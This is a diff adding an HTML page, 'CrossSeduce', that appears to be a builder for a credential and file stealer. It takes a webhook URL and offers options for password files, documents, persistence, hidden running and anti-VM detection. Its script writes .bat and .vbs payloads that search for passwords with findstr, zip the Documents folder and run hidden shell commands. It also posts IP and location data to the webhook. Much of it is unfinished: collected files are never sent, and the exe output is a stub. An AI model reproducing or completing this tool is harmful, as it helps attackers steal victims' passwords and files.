@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>CrossSeduce</title>
+<style>
+body{background:#1E1E1E;color:#fff;font-family:sans-serif;margin:15px}
+.header{display:flex;border-bottom:1px solid #444;padding-bottom:8px;margin-bottom:10px}
+.logo{font-size:18px;font-weight:bold;color:#8B0000}
+.input-group{display:flex;margin-bottom:10px}
+.input{flex:1;padding:6px;background:#2D2D2D;border:1px solid #444;color:#fff;border-radius:3px;margin-right:8px}
+.btn{background:#8B0000;color:#fff;border:none;padding:6px 10px;border-radius:3px;cursor:pointer;font-weight:bold}
+.content{display:grid;grid-template-columns:repeat(2,1fr);gap:10px;margin-bottom:10px}
+.panel{background:#2D2D2D;padding:10px;border-radius:4px}
+.panel h3{margin:0 0 8px;border-bottom:1px solid #444;padding-bottom:4px}
+.option{margin-bottom:6px}
+.footer{display:flex;justify-content:space-between;border-top:1px solid #444;padding-top:10px;margin-top:10px}
+.status{position:fixed;bottom:15px;right:15px;padding:6px 12px;border-radius:3px;display:none;z-index:100}
+.success{background:rgba(0,128,0,0.8);color:#fff}
+.error{background:rgba(139,0,0,0.8);color:#fff}
+</style>
+<script>
+let timer;
+window.onload=function(){};
+function testWebhook(){
+const webhook=document.getElementById("webhook").value;
+if(!webhook){showStatus("Please enter a webhook URL","error");return}
+if(webhook.startsWith("https://")||webhook.startsWith("http://")){
+const payload={embeds:[{title:"Webhook Test",description:"Your webhook is working correctly!",color:65280}]};
+fetch(webhook,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)})
+.then(r=>{r.ok?showStatus("Webhook test successful!","success"):showStatus(`Webhook error: ${r.status}`,"error")})
+.catch(e=>showStatus(`Webhook error: ${e.message}`,"error"))}
+else{showStatus("Invalid webhook URL format","error")}}
+
+function buildFile(){
+const webhook=document.getElementById("webhook").value;
+let filename=document.getElementById("filename").value;
+const filetype=document.getElementById("filetype").value;
+if(!webhook){showStatus("Please enter a webhook URL","error");return}
+if(!filename)filename="system_data";
+const options=getSelectedOptions();
+sendToWebhook(webhook,options);
+const content=generateFileContent(webhook,options,filetype);
+const blob=new Blob([content],{type:'text/plain'});
+const url=URL.createObjectURL(blob);
+const a=document.createElement('a');
+a.href=url;a.download=`${filename}.${filetype}`;
+document.body.appendChild(a);a.click();document.body.removeChild(a);
+URL.revokeObjectURL(url);
+showStatus("Build completed! File saved","success")}
+
+function getSelectedOptions(){
+const options={};
+const inputs=document.getElementsByTagName("input");
+for(let i=0;i<inputs.length;i++)
+if(inputs[i].type==="checkbox")options[inputs[i].id]=inputs[i].checked;
+return options}
+
+async function sendToWebhook(webhook,options){
+const ipInfo=await getIPInfo();
+let fields=[];
+if(options.ip)fields.push({name:"IP",value:ipInfo.ip,inline:true});
+if(options.location)fields.push({name:"Location",value:ipInfo.city,inline:true});
+if(options.country)fields.push({name:"Country",value:ipInfo.country,inline:true});
+if(options.browser)fields.push({name:"System",value:navigator.userAgent,inline:false});
+if(options["password-files"])fields.push({name:"Password Files",value:"Searching for password files...",inline:false});
+if(options["zip-files"])fields.push({name:"File Archive",value:"Creating zip archive of files...",inline:false});
+if(options.documents)fields.push({name:"Documents",value:"Scanning documents folder...",inline:false});
+if(options.desktop)fields.push({name:"Desktop",value:"Scanning desktop files...",inline:false});
+const payload={embeds:[{title:"System Information",color:9109504,fields:fields}]};
+try{await fetch(webhook,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)})}
+catch(e){console.error('Error:',e)}}
+
+async function getIPInfo(){
+try{const r=await fetch('https://ipinfo.io/json');return await r.json()}
+catch(e){return{ip:"Unknown",city:"Unknown",country:"Unknown"}}}
+
+function generateFileContent(webhook,options,filetype){
+let content="";
+switch(filetype){
+case "bat":
+content=`@echo off\r\nrem Generated File\r\necho Initializing...\r\n\r\nset webhook=${webhook}\r\n\r\n`;
+if(options["password-files"])content+=`echo Searching for password files...\r\nfindstr /si password *.txt *.xml *.ini > %temp%\\pwds.txt\r\n`;
+if(options["zip-files"])content+=`echo Creating zip archive...\r\npowershell -command "Compress-Archive -Path C:\\Users\\%username%\\Documents\\* -DestinationPath %temp%\\files.zip"\r\n`;
+content+=`\r\necho Process completed.\r\nexit`;break;
+case "vbs":
+content=`' Generated File\r\n' Webhook: ${webhook}\r\n\r\nMsgBox "Initializing...", 64, "System Process"\r\n\r\n`;
+if(options["password-files"])content+=`Set objShell = CreateObject("WScript.Shell")\r\nobjShell.Run "cmd /c findstr /si password *.txt *.xml *.ini > %temp%\\pwds.txt", 0, True\r\n\r\n`;
+content+=`MsgBox "Process completed.", 64, "System Process"`;break;
+case "exe":
+content=`// Generated File\r\n// Webhook: ${webhook}\r\n\r\n// System information collection tool\r\n`;break;}
+return content}
+
+function showStatus(message,messageType){
+const statusElement=document.getElementById("status");
+statusElement.innerText=message;
+statusElement.className=`status ${messageType}`;
+statusElement.style.display="block";
+clearTimeout(timer);
+timer=setTimeout(()=>{statusElement.style.display="none"},3000)}
+</script>
+</head>
+<body>
+<div class="header">
+<div class="logo">CrossSeduce 🐲</div>
+</div>
+<div class="input-group">
+<input type="text" class="input" id="webhook" placeholder="Enter webhook URL...">
+<button class="btn" onclick="testWebhook()">Test</button>
+</div>
+<div class="content">
+<div class="panel">
+<h3>System Information</h3>
+<div class="option"><label><input type="checkbox" id="ip" checked>IP Address</label></div>
+<div class="option"><label><input type="checkbox" id="location" checked>Location</label></div>
+<div class="option"><label><input type="checkbox" id="country" checked>Country</label></div>
+<div class="option"><label><input type="checkbox" id="browser" checked>Browser/OS</label></div>
+<div class="option"><label><input type="checkbox" id="hardware">Hardware Info</label></div>
+</div>
+<div class="panel">
+<h3>File Collection</h3>
+<div class="option"><label><input type="checkbox" id="password-files">Password Files</label></div>
+<div class="option"><label><input type="checkbox" id="zip-files">Create ZIP Archive</label></div>
+<div class="option"><label><input type="checkbox" id="documents">Documents Folder</label></div>
+<div class="option"><label><input type="checkbox" id="desktop">Desktop Files</label></div>
+<div class="option"><label><input type="checkbox" id="browser-data">Browser Data</label></div>
+</div>
+</div>
+<div class="panel">
+<h3>Advanced Options</h3>
+<div class="option"><label><input type="checkbox" id="startup">Add to Startup</label></div>
+<div class="option"><label><input type="checkbox" id="hidden">Run Hidden</label></div>
+<div class="option"><label><input type="checkbox" id="persistence">Enable Persistence</label></div>
+<div class="option"><label><input type="checkbox" id="anti-vm">Anti-VM Detection</label></div>
+</div>
+<div class="footer">
+<div>
+<select id="filetype" class="input" style="width:100px">
+<option value="bat">BAT File</option>
+<option value="vbs">VBS File</option>
+<option value="exe">EXE File</option>
+</select>
+<input type="text" class="input" id="filename" placeholder="Filename" style="width:150px">
+</div>
+<button class="btn" onclick="buildFile()">BUILD</button>
+</div>
+<div id="status" class="status"></div>
+</body>
+</html>
